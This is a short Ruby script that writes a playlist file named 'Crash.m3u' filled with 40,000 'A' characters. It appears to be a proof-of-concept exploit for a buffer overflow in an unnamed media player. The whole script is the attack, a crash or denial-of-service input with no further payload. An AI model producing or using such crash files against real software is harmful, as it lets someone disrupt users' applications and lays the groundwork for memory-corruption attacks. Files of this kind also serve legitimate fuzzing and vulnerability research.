#!/usr/bin/ruby
File.open "Crash.m3u" , "w" do |file|
	junk = "A" * 40000
	file.puts junk
end

